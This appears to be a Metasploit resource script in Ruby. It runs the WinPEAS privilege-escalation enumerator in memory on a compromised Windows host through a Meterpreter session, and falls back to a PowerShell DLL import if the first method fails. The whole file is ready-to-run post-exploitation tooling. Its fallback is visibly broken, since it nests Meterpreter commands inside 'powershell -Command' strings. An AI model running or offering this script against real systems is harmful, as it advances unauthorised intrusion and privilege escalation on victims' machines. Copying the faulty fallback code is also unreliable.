# Metasploit automation script to execute WinPEAS as a .NET assembly in-memory
# using post/windows/manage/execute_dotnet_assembly module.
#
# This script demonstrates:
# - Setting the session
# - Specifying the path to WinPEAS .NET executable
# - Running the module
# - Fallback to PowerShell import and execution if module unavailable
#
# Usage:
#   Load this script in msfconsole and run:
#     run winpeas_dotnet_execution_example.rb -j -z
#
# Note:
# - Ensure the session ID is valid and connected to a Windows x64 target.
# - Ensure WinPEAS .NET executable path is accessible.
# - Avoid injecting into incompatible native processes like Notepad.

session_id = 1  # Replace with your Meterpreter session ID
winpeas_path = '/path/to/winpeas.exe'  # Replace with actual path to WinPEAS .NET executable

# Load the execute_dotnet_assembly post module
post_module = framework.modules.use('post', 'windows', 'manage', 'execute_dotnet_assembly')

# Set required options
post_module.datastore['SESSION'] = session_id
post_module.datastore['ASSEMBLY_PATH'] = winpeas_path

print_status("Running execute_dotnet_assembly module for WinPEAS on session #{session_id}...")
begin
  post_module.run
rescue ::Exception => e
  print_error("Failed to run execute_dotnet_assembly module: #{e.message}")
  print_status("Falling back to PowerShell import and execution...")

  # Fallback: Use Meterpreter PowerShell extension to import and execute WinPEAS DLL in memory
  powershell_dll_path = '/path/to/winpeas.dll'  # Replace with actual path to WinPEAS DLL

  # Import the DLL
  cmd_import = "powershell_import #{powershell_dll_path}"
  print_status("Importing WinPEAS DLL via PowerShell: #{cmd_import}")
  client.run_single("powershell -Command \"#{cmd_import}\"")

  # Execute the DLL function
  cmd_execute = "powershell_execute Invoke-WinPEAS"
  print_status("Executing WinPEAS DLL via PowerShell: #{cmd_execute}")
  client.run_single("powershell -Command \"#{cmd_execute}\"")
end

print_good("WinPEAS execution attempt completed. Ensure process architecture matches target (x64). Avoid injecting into native processes like Notepad.")
